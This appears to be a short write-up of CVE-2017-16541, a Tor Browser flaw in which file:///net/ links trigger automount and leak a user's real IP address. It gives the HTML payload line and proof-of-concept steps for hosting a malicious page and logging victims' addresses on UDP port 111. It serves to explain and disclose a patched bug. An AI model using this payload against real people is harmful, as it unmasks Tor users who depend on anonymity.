# A Breif Introdction of CVE-2017-16541 

## Vulnerability Details

![overview][overview-image]

### Overview
When a user open a webpage containing "file://" handler with Tor Browser(version <= 7.0.8), the automount/autofs will be called automatically. Because automount/autofs is processed by the kernel, Tor Browser can fail to use Tor circuit and any other proxies to hide the connection.Even if javascript is disabled, this vulnerability can still be exploited.

### What is Automount

For different hardware devices such as hard disk and CD rom, computers need different file systems to access the data. On linux and macOS, users should use command "mount" and specify the file system when they want to a access new storage devices which is very cumbersome.

Automount/Autofs is a convenient file system management tool whcih allows the system administrator to configure all the file systems that the machine can access. Therefore, users can access the storage devices in a completely transparent way without caring about how the kernel do all these jobs.

What's more, Automount allows NFS(Network File System) mount points to be automatically mounted when accessed. And Automount can be configured to allow a path starting with ‘/net/’ to specify the remote server address and path. For example, ‘ls /net/"test ip"/xxx’ will trigger an NFS connection to test ip. This is the default configuration on Mac OSX.

### How Does the Automount Deanonymize Tor Browser Users

1.Victim gets the malicious html which contains &#60;link href=’file:///net/"test ip"/a.css’ rel=’stylesheet’&#62;   through Tor Browser.

2.Tor Browser begins to load the a.css. Automount is triggered by the ’file:///net/"test ip"/a.css’ handler.

3.Victim's system connects to test ip directly, and the fake NFS learns the victim's real IP address. This connection is behind the scenes and automatic so the victim can not realise.

![process][process-image]
## PoC
Firstly, download 7.0.8 version of Tor Browser. [download](https://archive.torproject.org/tor-package-archive/torbrowser/7.0.8/)

Secondly, run a web server and upload our malicious html, such as running a nginx on google cloud, use other browsers to try to access the malicious page.
You can add an img tag in your html, because it can also trigger the exploitation.
Replace the IP address in the file:/// handler with the IP address of this server. In this way, victim will send udp package for NFS to this server.

![chrome][chrome-image]

Thirdly, on the same server, we run a python code which can listen to portmap requests (UDP port 111) and immediatley reject the connection. It can help us to prevent victims noticing and collect the IP address of victims.

![code][code-image]
![run][run-image]

Thirdly, open the tor browser and access our server, then the malicious web page is loaded.

If you do not see any direct connection between your computer and your server. It's normal, because for some reason the problem does not  occur reliably.

But you can type the view page info button, then IP address leak will happen. On server, you can see the true IP address of your computer, and on computer, you can see the captured udp packages which send to your server(with Wireshark or tcpdump).

![info][info-image]
![leak][leak-image]

## Solution 
Get a higher version of Tor Browser or manually install a patch.

## References 

[TorMoil – Deanonymize Tor Browser Users with Automount](https://www.wearesegment.com/research/tormoil-deanonymize-tor-browser-users-with-automount/). 

[Bug Tracking Log](https://bugzilla.mozilla.org/show_bug.cgi?id=1412081). 

[Tor Browser 7.0.9 is released](https://blog.torproject.org/tor-browser-709-released). 

[process-image]: ./process.png
[overview-image]: ./overview.png
[chrome-image]: ./chrome.png
[code-image]: ./code.png
[run-image]: ./run.png
[info-image]: ./info.png
[leak-image]: ./leak.png
